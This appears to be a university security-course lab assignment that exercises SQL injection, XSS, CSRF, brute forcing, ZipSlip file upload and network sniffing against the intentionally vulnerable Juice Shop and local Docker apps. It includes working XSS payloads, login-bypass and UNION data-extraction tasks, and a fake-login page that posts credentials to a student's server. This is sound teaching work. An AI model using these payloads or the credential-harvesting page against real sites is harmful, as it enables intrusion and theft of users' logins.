Computer Security Lab 2: Networks and web security
====
## Preliminary tasks

* Read the sections ```Background``` and ```Theory``` from this document and ```SQL.md```
* If you are not using the course's Kali VM, make sure that all of this lab's prerequisites are met on your own system

## About the lab

* This document contains task descriptions and theory for the network lab. If there are any differences between the return template and this file, consider this to be the up-to-date document.
* **You can use your own computer/virtual machine if you want.** Check the chapter "Prerequisities" for information on what you need to install. This lab has been made to be completed in a Linux environment and tested to work in the provided Kali Linux virtual machine.
* It is estimated, that you are able to do Tasks 1-3 during a typical lab session (4 hours). **Upper grade requires that all previous ones have been done as well.**
* Check the deadline from Moodle and __remember that you have to return your name and GitHub repository information to Moodle before deadline.__

## Background

Most of us browse the Internet daily. We are using a wide variety of platforms and browsers to access different kind websites or web applications. In many cases, users can give some kind of *input* to these websites or applications, regardless of their platform or browser. A lot of things could go wrong if this user input is not properly validated or sanitized.

In this lab, we will go over some basic network and web-related security issues with the help of [OWASP Juice Shop](https://github.com/bkimminich/juice-shop).

This site could be just like any other website, but if we cite the developers of it: "Juice Shop is supposed to be the opposite of a best practice or template application for web developers.", we might suppose that it is not.

OWASP collects a list of [top 10 security risks](https://www.owasp.org/index.php/Top_10-2017_Top_10) each year. Juice Shop contains them all, and therefore it is a great tool for demonstrating them.

The intention is to learn *why* the following things on tasks are happening and how we might be able to prevent them.

On a later task, we will also practice capturing and analyzing traffic with [WireShark](https://www.wireshark.org/), and further by using [Nmap](https://nmap.org/) for mapping the network. Our target will be [Example Voting App](https://github.com/dockersamples/example-voting-app)

## Theory

Juice Shop is vulnerable to multiple types of [injections](https://www.owasp.org/index.php/Top_10-2017_A1-Injection). Here we are mostly focusing on [SQL injections](https://www.owasp.org/index.php/SQL_Injection). In SQL injection, the user injects SQL code to the SQL query happening on the server-side. This is usually possible because the SQL query that is happening on the server-side takes the client's input *straight* as a parameter. An attacker can modify the query and this way expose, modify or even destroy data in the database. SQL is just one example of injection - any similar way, which takes some strings or characters as input to create some kind of command, can be vulnerable.

In many places, the Juice Shop is [improperly validating its inputs](https://cwe.mitre.org/data/definitions/20.html). This gives the attacker the ability to give an input that the application is not expecting. You will see this in action when you cash out with a negative amount of items or when you leave a 0-star review of the store.

 Usually, shops like Juice Shop are made to be used by multiple users. In these cases, different users have different privileges and are therefore able to access different places. For example, you are able to access your basket but not other users' baskets. In the same fashion only admin should be able to access the administration panel. However, Juice Shop's [access control is broken](https://en.wikipedia.org/wiki/Privilege_escalation) and users can access places that they should not be able.  

We also delve into the basics of cross-site request forgery. A short explanation of the concept taken from [OWASP](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))."Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data since the attacker has no way to see the response to the forged request. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker's choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state-changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application."

The final thing we focus on by using the Juice Shop is Cross-Site Scripting. A short explanation of what Cross-Site Scripting means taken from [OWASP:](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)) "Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end-user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page ". During this lab, you will see XSS in action and will create your own attack. 

<details>
<summary>Helpful links for learning more:</summary>

https://cwe.mitre.org/data/definitions/20.html

https://www.owasp.org/index.php/Data_Validation

https://www.owasp.org/index.php/Top_10-2017_A1-Injection 

https://www.owasp.org/index.php/Injection_Flaws

https://www.owasp.org/index.php/SQL_Injection

http://cwe.mitre.org/top25/

https://en.wikipedia.org/wiki/Privilege_escalation

https://www.owasp.org/index.php/DOM_Based_XSS

https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
</details>


## Prerequisites


If you are using the virtual machine provided to you by the course staff,
then everything should be already installed to your machine. 

Below are the steps to set it up on your own system, in case you want to use your own computer, or you are otherwise unable to acquire the provided virtual machine.

<details> <summary>By tasks (Click to collapse)</summary>

### Task 1

Get [Docker](https://www.docker.com/) instance for Juice Shop v8.7.2:
```shell
~$ docker pull bkimminich/juice-shop:v8.7.2
```

All the tasks are doable using your browsers developer tools. Tasks were tested and created by using Firefox, but other browsers should work just as well.

### Task 2

For the brute-forcing task, the tools vary depending on how you choose to do it. Read the instructions and proceed to get the tools you want. There are some hints in the task description.

In the CSRF task, you will need to host a website locally. Course's Kali Linux vm uses apache2, but you are free to choose your own method.

### Task 3

Depending on the way you choose to complete this task, you might need to set up a basic python and [flask](http://flask.pocoo.org/)/[BaseHttpServer](https://docs.python.org/2/library/basehttpserver.html) server. You are free to set up the server any way you wish.

### Task 4

the example-voting app is located at
```shell
~$ git clone https://github.com/dockersamples/example-voting-app
```

Install Wireshark and Nmap. The method depends on your operating system.

For the security experiment, you can use Burp, ZAP or any other tool you wish.

---

</details> 

## Grading

<details> <summary>Details (Click to collapse)</summary>
You are eligible to following grades in this exercise by doing tasks as defined. Great ideas and implementations could compensate for some poorly implemented ones.
Upper grade requires that all previous ones have been done as well.

It is estimated, that you are able to do Tasks 1 & possibly 2 during lab session (4 hours).

Task| Grade/Level | Description
:--:|:--:|--
1|2|Basic SQL injections, Client-Side resource manipulation and basics of Cross-Site Scripting
2|3|More complicated SQL injections, Cross-Site Request Forgery, and Brute Forcing
3|4| Arbitrary file upload and Cross-Site Scripting
4|5| Network traffic analysis and a security experiment

Grade 1 can be acquired by doing lecture questionnaires from the corresponding lecture.

### Particularly in tasks 1 and 2:

***To be able to complete these tasks,*** you will need to explain *why things are happening*. Each answer, which is giving only pure commands or code is automatically though as incompleted or insufficient.

We are aware, that some answers are already available out there.

</details>

---

## Task 1

Start the Juice Shop v8.7.2 docker instance. Use the Network tab in your browser's developer tools to follow the traffic.

If you are rusty on your SQL injections check the following before you start: https://www.acunetix.com/websitesecurity/sql-injection/

Start Juice Shop with the command
```shell
~$ docker run --rm -p 3000:3000 bkimminich/juice-shop:v8.7.2
```
Site is hosted at ```localhost:3000```. Access it with your browser. Observe and modify the traffic with your browsers developer tools while browsing the site and do the following tasks.

__Note:__ In Firefox's dev tools, in the "Headers" section of packet information, there is a handy "Edit and Resend" button that can be used to modify packets.

---


### Basic SQL Injections

**Noticing errors**

Try to search for something from the store by using the search field and monitor the network traffic. Pay attention to how the store sends the search query to the server. You can see, that the search field is only used to apply a filter to a dataset that is requested from the server when loading the page, so the search field itself is not vulnerable to SQL injection. However, you can see the API endpoint where the requests are sent. 

Use your browser's developer tools to edit and resend this request, and cause an __SQL__ error by injecting some SQL as the search argument. The server will return an SQL error message if you cause one, and it is viewable from the browser's developer tools.

<details>
<summary>Hint</summary>
The GET request is sent to http://localhost:3000/rest/products/search?q=. Try different SQL symbols like statement terminators, comments and quotation marks. Check the network tab for servers response.
</details>

__What did you use as the search argument to cause an error?__

__Why did it cause an error?__
 
__Paste here the command that the SQL server attempts to execute and replace the part(s) taken from the search field with the text "SEARCHRESULT".__ 

---

**Deleted item?**

The shop has an item that has been deleted and therefore does not show on searches. For some reason, the shop doesn't just remove the item but instead uses another way to set the item as deleted. Do an SQLi-attack that returns all the items (including the deleted one). Use your browser's developer tools to observe the response from the server.

<details>
<summary>Hint</summary>
Examine the SQL-query that the server returned in the last part. How does this query exclude deleted items? Remove that part of the query using comments.
</details>

__How are the items "deleted"?__

__How did you make the server to return all the items?__
 

__Explain shortly the logic behind your attack. Why does it work?__

---

**A bit more concrete error**

As we previously noticed, we are indeed able to inject some SQL commands to the server using search queries. How about login fields? If this area is vulnerable, it could be very dangerous, because it might enable unauthorized access.

Inject some SQL into the login fields, [bypass the login](https://www.acunetix.com/websitesecurity/sql-injection/) and log in as the first user in the database.

__What command(s) did you use?__

__Why it is working/what is happening?__

__What user did you login as?__


---
### Inspecting the client resources

**Scoreboard**

Sometimes the HTML contains unwanted stuff. This site, for example, has a hidden scoreboard. Use your browsers developer tools and find the path to it.

<details>
<summary>Hint</summary>
Firefox's developer tools has debugger that shows sources. Try to find the path by using some guessed keywords.
</details>

__How did you find the path?__

---

**Administration panel**

You might see some additional and interesting stuff while inspecting sources. Try to search for clues about administration and access the Juice Shop's administration panel.

<details>
<summary>Hint</summary>
Check task 'Scoreboard'. You have to be logged in as the admin to access the page.
</details>

__What is the administration panel's URL?__

---
### XSS attacks

**Annoying pop-up**

Next, we attempt some cross-site scripting attacks. While you are logged in as any user, insert the following code snippet to the "Order ID" field in the "Track Orders" tab and to the search field. This should trigger the XSS:

```js
<iframe src="javascript:alert(`xss`)">
```

Attack on the "Order ID" is an [reflected XSS attack](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)#Reflected_XSS_Attacks) and the attack on the searchfield is [DOM based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).

__What is the difference between these two types of attacks?__

---

**Persistent XSS**

XSS attacks above are relatively harmless, as they affect only you. It would be more harmful if you could get a damaging code snippet inside the database or make the results of the script otherwise visible to other users. One way to do this is to create a user that has a malicious script as its name.

In this example, we are going to create a user with the following as it's email address: 

```js
<iframe src="javascript:alert(`xss`)">
```

This will show the alert popup for anyone visiting the administration panel. 

You can't create a user with the previously mentioned ```iframe``` object as its name using the create account page. This is because Juice Shop validates the input in the client-side **but** not on the server-side. For this reason, we are going to use curl to send the user creation packet directly to the API, this way bypassing the site's input validation (browser's developer tools should also work). In order to do this, we need to know what type of packet the API expects.

We can find out the type of packet we need in the following way:

* Create a user with whatever username and password you like.
* Check the post packet that is sent when you press the create user button. From this packet, you see the location and the packet content that is needed to create an account.
* Create a JSON file that is in the same format as in the POST request, change the email field to the code snippet mentioned above and send it to the user creation API using curl. Below is an example of the curl request.  

```shell
~$ curl -d @<your_json_file_name>.json -H "Content-Type: application/json" -X POST <API_url>
```
After this, log in as the administrator and go to the administration panel. You should be welcomed by an alert popup and the administration panel should have a weird looking user entry.

__How can you protect your applications against XSS attacks?__

---

## Task 2 

**'These are not my credentials'**

Use SQL injection in the GET request in a similar way as in Task 1, but this time use [UNION](http://www.sqlinjection.net/union/) command to get all the users emails and password hashes.

<details>
<summary>Hint</summary>
In this exercise, you need to know the name of the users table, its column number and the name of the email and password fields. These values can be guessed. Table and column names are obvious. Try guessing them and check the error messages if you got it right.
</details>

First, form a statement that attempts to select all the columns from the users table. If the server returns "table does not exist" you guessed it wrong. If you receive the following error "SQLITE_ERROR: SELECTs to the left and right of UNION does not have the same number of result columns" you are on the right track. 

After you know the table name, you have to find out how many columns the Products table has, so you can select that many columns from the users table. 

You can guess this if you want to, but the column amount can also be found from the response you get from a product search. Now select that many columns from the users table where at least two of them are email and password. If the values are not visible, you might have put it to a field that is not rendered visible. Try putting it to a different field.


__What SQL command did you use?__

__Explain shortly the logic behind your attack. Why and how does it work?__

---


**Cross-site request forgery**

Next, we create a basic example of a cross-site request forgery (CSRF) attack. We are trying to simulate a case, where a user is browsing a site and opens a malicious web site that does something harmful. We are going to create a site that changes the currently logged in user's nickname when they visit this webpage while logged in to the Juice Shop. For this purpose you have an apache2 server running in your virtual machine. If you access www.csrfattack.org you should see a placeholder site that you can modify.

Do the following:

* Change any accounts nickname and observe what type of request is sent and to where
    * Use developer tools in Firefox
* Create a webpage that, when accessed by someone who is logged in to the Juice Shop, changes their nickname to "compsec". 
    * Site doesn't have to have anything other than the attack. No need to make it look fancy.
    * If you are not sure where to start, check [this](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)) for more info on CSRF.
* Log in as any user. Then open your malicious site www.csrfattack.org in another tab. 
* Refresh the page and see did the nickname change.

Few helpful commands

If the site is not visible at www.csrfattack.org, modify the ```/etc/hosts``` file by adding ```127.0.0.1    www.csrfattack.org``` after localhost and kali and then restart the apache2 service with the command:
```
~$ sudo service apache2 restart
```
You can modify the template site by editing the file found in 
```
/var/www/html/index.html
```
If your modified HTML doesn't show up on the site, try to restart apache2.

#### Returns

* index.html

---
**Brute forcing**

Now we will do something different and try some basic brute forcing. Do the following:

* Start [muumitalo](https://github.com/Latsis/Muumitalo).  ```git clone https://github.com/Latsis/Muumitalo``` follow the instruction on the git page on how to start it. You will be brute forcing this server
* Create a wordlist containing mutations of the word "vaapukkamehu". Create mutations where individual letters case changes between upper and lower case. Also make mutations where letter 'a' can be number '4' and letter 'e' can be number '3'. (For example 'va4pukK4m3Hu'.)
* Brute force the right answer to the question posed by the server using the wordlist you created.
You can use any tools you find online. If you want to, you can code your own mutator. Alternatively, you can search online for an existing mutator/mutators and use them to create the wordlist. Same thing with the actual attack. You can use programs like [OWASP ZAP](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project) to do the actual attack after you have created the wordlist.

#### Returns

* Wordlist
* Any code you created.
* Detailed description on how you created the wordlist and how you did the brute force attack.

<details>
<summary>Hint</summary>
The Internet is full of tools to create wordlists, but if you plan to create your own, check python itertools. You can use existing tools to do the attack if you don't feel like creating your own script. OWASP ZAP, for example, can do the attack easily if you have a list containing all the mutations. Burp Suite Community edition doesn't allow you to use files as payloads, so don't try to do the attack with it.
</details>

<details>
<summary>Sending HTTP requests with ZAP</summary>
If you are using the provided Kali Linux vm, you can find owasp-zap in the Applications menu under Web Application Analysis.

Send a POST request manually to your target using Manual request editor in Tools. Select the request from the history and use the Fuzzer to attack your server (Attack > Fuzz...).

Highlight the part of the request that you want to modify in the attack and add it as a fuzzing location. Add the wordlist file as the payload for that specific fuzzing location and start the attack.
</details>

---

## Task 3

Let's get back to the Juice Shop.

The XSS attack you did in the previous task was mostly just annoying, but combining the vulnerability with others can lead to some very phishy attacks. Next, we are going to create an XSS attack using arbitrary file upload vulnerability. 

### Combining arbitrary file upload and XSS

Juice Shop has released its new marketing video at ```http://localhost:3000/promotion```. Viewing the page source shows you a couple of things:
* the video is loaded from ```http://localhost:3000/video```.
* subtitles are embedded on the page itself and they are in *WebVTT* format.
* subtitles are enclosed in a ```<script>``` tag.

Use the Network tab in your browser's developer tools to inspect the response when visiting ```http://localhost:3000/video```. You should be able to see an interesting header: ```Content-Location: /<path>/<to>/<file>``` (if it doesn't show up on Firefox, try Chromium). You can access the video directly by using the path ```http://localhost:3000/<path>/<to>/<file>```. Since the subtitles are in *WebVTT* format, there should be a corresponding *.vtt* file alongside the video which you should also be able to access, just by changing the file extension. The promotion page source showed you that the subtitles are embedded to the page on the server-side, so if the subtitle file could be overwritten, you might be able to inject some javascript to that page.

Juice Shop allows its customers to upload *zip* files with the site's *File Complaint* feature. However, they don't handle the file upload very well and their upload mechanism is vulnerable to [ZipSlip](https://snyk.io/research/zip-slip-vulnerability). If the uploaded *zip* archive contains files that have special directory traversal characters ("../", "..\\") and file paths in their names, the attacker can specify the location where those files will be placed on the server's filesystem when the archive is unpacked and even overwrite some existing files.

**Your task is to use the file upload vulnerability to overwrite the subtitle file and create an XSS attack that makes the promotional page look like Juice Shop's login page, and when a user inputs their credentials, the site should send those credentials to your own server.** So, do the following:

* **Setup a server.** There's no need to do anything too fancy, you just need to be able to show that you received the POST request data from the fake login page. For example, you can create a basic Python [Flask](http://flask.pocoo.org/)/[BaseHttpServer](https://docs.python.org/2/library/basehttpserver.html) or just set up a ```netcat``` listener. Anything goes as long as it shows that the data entered the server.

* **Create the payload.** The payload should be a *.zip* archive that contains your *.vtt* file that has directory traversal characters added to its filename, so when the server unpacks the archive, your *.vtt* file will overwrite the original subtitle file. 
    * The filename should include traversal characters to go up two directories to get to the root folder before the path.
    * Juice Shop's directory structure is created by AngularCLI during the application compilation, so the actual path to the subtitle file is ```/frontend/dist/frontend/<path>/<to>/<file>```.
    * The *.vtt* file itself should contain some HTML and javascript, so when the server tries to load the subtitles, it loads your script instead and makes the page look like the login page.

* **Upload the payload.** Use the arbitrary file upload vulnerability in *Contact Us > File Complaint* to upload your payload and overwrite the original subtitle file.

* **When the user accesses the Juice Shop's promotional page, it should now look like the Juice Shop's login page.** It should be as similar as possible but small differences are fine. For example slightly different size login fields, email field not checking for @ sign, etc.

* **When the user inputs anything to the email and password fields and presses the *Login*-button, the information is sent to your server.** The way you send/show the information is up to you. You just have to demonstrate on the server-side that the data has entered and that it is the same as what the user has input to the email and password fields.

<details>
<summary>Tips, tools and code snippets for creating the payload</summary>
<ul>
<li>Create a script that hides the video object in the page, makes a form that looks like Juice Shop's login page and sends the credentials to your own server.</li>
<li>Helpful code snippets:</li>
<ul>
<li>Setting the video style hidden

```javascript
var video = document.querySelector('video');
video.style.height = '1px';
video.style.visibility = 'hidden';
```
</li>
<li>Easy form that sends user inputs to target_url as POST request

```html
<form action="http://target_url" method="post">
    <input type="text" name="username">
    <input type="password" name="password">
    <input type="submit" value="Log in">
</form>
```
</li>
</ul>
<li>You can use <a href="https://github.com/Latsis/ZipSlipGen">ZipSlipGen</a> to create the <i>zip</i> archive that contains your <i>.vtt</i> file that has directory traversal characters added to its filename (<i>../../frontend/dist/frontend/path/to/file.vtt</i>).</li>
</details>


#### Returns

* Your own server code or a description of how you showed the received data.
* Your own HTML/Javascript **without directory traversal characters in its name**.
* The *zip* archive that you uploaded to overwrite the subtitle file.
* **Clear** instructions on how to start your own server, send the XSS attack and how to verify that the information was sent to your server from Juice Shop.

---

## Task 4

You can complete this task in two ways. You can do the predefined task explained below or you can suggest a task that interests you and do that. __Contact the course assistants__ and describe them what you are interested in doing/trying to do. If they say it is good you can do that as your task 4.

### Setup

Get the example-voting-app
```shell
~$ git clone https://github.com/dockersamples/example-voting-app
```

Start the example-voting-app
```
~$ cd example-voting-app
~$ docker-compose up
```
### Task
In this task, you are expected to learn to capture traffic by using WireShark, and to do very basic network analysis. With the knowledge you gain, you are then expected to draw a data flow diagram on how the system behaves when you cast a vote or check the results. After this, you try some form of a security experiment(for example modify traffic using Burp Suite). Report your results even if you are unsuccessful. 


__Hint__
 You can draw the diagram by hand and take a picture (assuming that the picture is clear enough) or use any tool you like to draw it. 
Scan networks (docker network ls, docker network inspect examplevotingapp_*, Nmap 172.xx.0.0/24)
Look at  https://github.com/dockersamples/example-voting-app for architecture diagram (good basis for DFD)
Use Wireshark on the two docker networks to see what happens when a vote is attempted
 

 
To run Wireshark correctly without using straight root privileges, we should add the current user to group *Wireshark* with the following command:
```shell
~$ sudo usermod -a -G wireshark compsec
```
Log out and log in, Wireshark should show now all interfaces. This is already done with the provided Kali Linux.


 ### How to complete this task

Return the following:

* Data flow diagram or some other type of picture/written document that explains the dataflow in the situation where you cast a vote and when you check the results

* Short explanation on the steps you took to analyze the network and create the diagram

* Short explanation on what kind of security experiment you tried, how you did it and what was the result






























